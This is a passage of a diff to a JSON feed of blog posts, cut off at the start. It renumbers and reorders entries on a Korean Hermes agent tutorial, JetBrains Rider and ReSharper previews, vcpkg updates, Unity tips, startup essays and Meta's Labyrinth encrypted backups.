자동화\n      - 반복 작업 스크립트화, 정기 실행(크론) 구성\n    - 이미지/음성\n      - 이미지 생성, 텍스트 음성 변환(TTS)\n    - 외부 도구 연동\n      - GitHub, Notion, Google Workspace, 메신저 전송 등(연결된 경우)\n\n\n- 기타 기능    \n   - 시스템 상태 리포트 자동 생성\n   - 웹 뉴스 요약 스크립트\n   - 폴더 정리 자동화 스크립트\n\n\n이제, ctrl+D를 눌러 헤르메스를 종료한다. 그럼 다음과 같이 이번 헤르메스 사용시 기록한 내용을 세션으로 저장해 보여주고, 사용된 시간, 호출한 도구 개수 등을 요약해 보여줄 것이다.\n\n\n\n\n마무리\n최근, 오픈 클로, 헤르메스 에이전트와 같은 멀티 에이전트 시스템이 크게 발전하고 있다. 다양한 모델과 스킬을 입맛에 맞게 사용할 수 있고, 컴퓨터 정리, 개발, 테스트, 서버 모니터링 등 다양한 목적으로 사용할 수 있다. 올라마 같은 로컬 모델 서빙 도구를 설치하면, 클로드나 제미니 같은 상업묭 모델 유료 토큰 사용하지 않고 무료로 로컬에서 실행되는 에이전트를 만들 수 있다. 좀 더 상세한 내용은 레퍼런스를 참고한다.\n\n레퍼런스\n\nNousResearch/hermes-agent: The agent that grows with you",
+    "reviews": [],
+    "syllabus": [],
+    "link": "http://daddynkidsmakers.blogspot.com/2026/05/blog-post.html",
+    "pubDate": "2026-05-09T14:45:47.682Z",
+    "creator": "Unknown",
+    "categories": []
+  },
+  {
+    "id": 11,
+    "imageUrl": "",
+    "title": "Rider 2026.2 Early Access Program Begins With Performance Improvements",
+    "description": "The Early Access Program (EAP) for Rider 2026.2 is now open, and the first preview build for the upcoming major release is already out.  There are several ways for you to get your hands on the first preview build: A reminder of what the EAP is all about The Early Access Program is a long-standing […]",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://blog.jetbrains.com/dotnet/2026/05/11/rider-2026-2-early-access-program/",
+    "pubDate": "Mon, 11 May 2026 13:16:02 +0000",
+    "creator": "Sasha Ivanova",
+    "categories": [
+      "net-tools",
+      "releases",
+      "rider",
+      "net-aspire",
+      "aspire",
+      "azure",
+      "azure-functions",
+      "eap",
+      "roslyn"
+    ]
+  },
+  {
+    "id": 12,
+    "imageUrl": "",
+    "title": "시대의 흐름 타기",
+    "description": "나는 일 년에 3~4번 정도 미국의 다양한 도시로 출장을 가는 데, 오래 가면 4주 동안 미국 전역을 이동한다. 한 달 동안 한 도시에서 하루 내지 이틀 숙박하고, 계속 비행하면서 한 호텔 체크아웃에서 다른 호텔 체크인으로 전전하다 보면 육체적으로는 당연히 힘들고, 정신적으로도 약간 피폐해진다. 그래서 장기 출장을 가면 체력 안배와 컨디션 조절에 그 어느 때보다도 신경을(...)",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://www.thestartupbible.com/2026/05/riding-the-wave-of-the-times.html",
+    "pubDate": "Sun, 10 May 2026 21:32:00 +0000",
+    "creator": "Kihong Bae",
+    "categories": [
+      "Uncategorized",
+      "ai",
+      "FoundersAtWork",
+      "media",
+      "technology",
+      "unicorn"
+    ]
+  },
+  {
+    "id": 13,
+    "imageUrl": "",
+    "title": "What’s New in vcpkg (Apr 2026)",
+    "description": "These updates include improved locking for parallel builds, cross-platform PE dependency analysis, manifest support for the depend-info command, and other improvements and bug fixes.\nThe post What’s New in vcpkg (Apr 2026) appeared first on C++ Team Blog.",
+    "reviews": [],
+    "syllabus": [],
+    "link": "https://devblogs.microsoft.com/cppblog/whats-new-in-vcpkg-apr-2026/",
+    "pubDate": "Thu, 07 May 2026 16:32:31 +0000",
+    "creator": "Augustin Popa",
+    "categories": [
+      "C++",
+      "Vcpkg",
+      "vcpkg"
+    ]
+  },
+  {
+    "id": 14,
     "imageUrl": "",
     "title": "트랙패드 키보드 종결자 나왔다. / Clevetura CLVX S",
     "description": "제가 좋아하는건 다들어있습니다.\n- 아름다운 불빛\n- 얇은 기판\n- 3손가락 이상 인식되는 트랙패드\n안좋은게 있긴하군요\ninsert / delete / home /  end\n찾아보니 CLVX 1 이라는 모델은 모든키가 있군요\n\n\n저는 살꺼면 이거 살꺼 같군요\n \n문제는 가격...\n\n\n풀배열은 249 달라\n작은건 199 달러군요\n\n\n \n3손가락 4손가락 옵션이 있는걸로 봐서 \n인식이 되나봅니다.\n스크롤도 되구요\n \n \n영상: https://www.youtube.com/watch?v=yAs4ShJ9pCk&t=13s",
@@ -121,58 +223,7 @@
     ]
   },
   {
-    "id": 9,
-    "imageUrl": "",
-    "title": "딸랑구와 달 기지 탐험, 프래그마타",
-    "description": "No description available",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://bbs.ruliweb.com/news/board/11/read/2451",
-    "pubDate": "Mon, 11 May 2026 10:12:57 +0900",
-    "creator": "｜RULIWEB｜",
-    "categories": [
-      "게임툰"
-    ]
-  },
-  {
-    "id": 10,
-    "imageUrl": "",
-    "title": "유니티 build-in 셰이더를 URP 로 변환하기",
-    "description": "나중엔 안쓰게 되겠지만 \n계속 이런일이 발생하네요 배워둘수 밖에 ...\n \n영상: https://www.youtube.com/watch?v=uKn2S7e-moI&t=306s\n\n\n\n \nbuilt-in 으로 작업하다 최근들어 URP 가 계속 영역을 늘리고 있어써\n메뉴 파악을 해두시는게 좋습니다.\n몇년안엔 전부 URP 로 넘어갈태니까 할일이 없겠지만\n지금은 과도기라 귀찮은 작업을 해줘야합니다.\n안에 셰이더 변환 메뉴 위치와\n셰이더 코드 수정 방법등을 알려줍니다.\n \n \n이게 1편이군요 \n위에 영상 하나만봐도 되는데\n이론 들으실분은 이것도 보시는게 좋겠습니다.\n영상: https://www.youtube.com/watch?v=vrmmBuGn77o",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://serverdown.tistory.com/1644",
-    "pubDate": "Fri, 8 May 2026 20:35:01 +0900",
-    "creator": "SID-NFT",
-    "categories": [
-      "urp",
-      "셰이더",
-      "유니티"
-    ]
-  },
-  {
-    "id": 11,
-    "imageUrl": "",
-    "title": "최후의 1인(=버티기)",
-    "description": "우리는 분기마다 투자팀 전원이 모여서 현재 살아 있는 포트폴리오를 검토한다. 각 멤버는 담당하는 회사의 기업 가치가 현실적인지를 판단하고 만약 현재 상황 대비 기업 가치가 너무 높다고 판단되면 우리가 선제적으로 회사 가치를 감액한다. 예를 들면, 가장 최근 투자를 기업 가치 100억 원에 받았다면, 서류상 이 회사의 적정 기업 가치는 100억 원으로 기재하는데, 만약에 이 가치가 현실적이지(...)",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://www.thestartupbible.com/2026/05/be-the-last-man-standing.html",
-    "pubDate": "Wed, 06 May 2026 21:22:00 +0000",
-    "creator": "Kihong Bae",
-    "categories": [
-      "Uncategorized",
-      "consistency",
-      "failure",
-      "FoundersAtWork",
-      "grit",
-      "hustle",
-      "inspiring",
-      "Strong"
-    ]
-  },
-  {
-    "id": 12,
+    "id": 15,
     "imageUrl": "",
     "title": "Labyrinth 1.1: Making End-to-End Encrypted Backups Even More Reliable ",
     "description": "We’re rolling out version 1.1 of Labyrinth, the encrypted storage system and protocol that secures messages and history on Messenger. Labyrinth 1.1 enhances the reliability of end-to-end encrypted backups with a new sub-protocol that helps messages survive the loss of a device, a switched device, and long gaps between sign-ins. Read our updated white paper, [...]\nRead More...\nThe post Labyrinth 1.1: Making End-to-End Encrypted Backups Even More Reliable  appeared first on Engineering at Meta.",
@@ -186,57 +237,6 @@
       "iOS",
       "Security & Privacy",
       "Messenger"
-    ]
-  },
-  {
-    "id": 13,
-    "imageUrl": "",
-    "title": "유니티 - 무료로 스카이박스 생성 / skybox",
-    "description": "무료 애셋도 쓸만합니다만\n유요하군요\n무료 생성이라니\n \n이젠 유료일지도 모르니 비용 잘 생가하셔서 위에 20$ 애셋을 쓸지 판단하셔야할것 같습니다.\n \n영상: 유니티 다크소울처럼 Sky Box를 이용하여 배경 꾸미기",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://serverdown.tistory.com/1648",
-    "pubDate": "Sun, 10 May 2026 13:56:43 +0900",
-    "creator": "SID-NFT",
-    "categories": [
-      "프로그래밍/유니티 에셋 리뷰",
-      "유니티",
-      "유니티애셋"
-    ]
-  },
-  {
-    "id": 14,
-    "imageUrl": "",
-    "title": "What’s New in vcpkg (Apr 2026)",
-    "description": "These updates include improved locking for parallel builds, cross-platform PE dependency analysis, manifest support for the depend-info command, and other improvements and bug fixes.\nThe post What’s New in vcpkg (Apr 2026) appeared first on C++ Team Blog.",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://devblogs.microsoft.com/cppblog/whats-new-in-vcpkg-apr-2026/",
-    "pubDate": "Thu, 07 May 2026 16:32:31 +0000",
-    "creator": "Augustin Popa",
-    "categories": [
-      "C++",
-      "Vcpkg",
-      "vcpkg"
-    ]
-  },
-  {
-    "id": 15,
-    "imageUrl": "",
-    "title": "The ReSharper 2026.2 Early Access Program Begins: Bringing More AI Agents into Visual Studio",
-    "description": "We’re excited to announce that the Early Access Program (EAP) for ReSharper and .NET Tools 2026.2 is now underway! While our EAP announcements usually cover a wide range of new features, performance updates, and bug fixes, this release is different. We are dedicating this first preview entirely to a singular, game-changing initiative: bringing true AI […]",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://blog.jetbrains.com/dotnet/2026/05/11/the-resharper-2026-2-eap-any-ai-agent-in-visual-studio/",
-    "pubDate": "Mon, 11 May 2026 13:16:35 +0000",
-    "creator": "Sasha Ivanova",
-    "categories": [
-      "net-tools",
-      "resharper",
-      "acp",
-      "ai-assistant",
-      "eap",
-      "junie"
     ]
   }
 ]
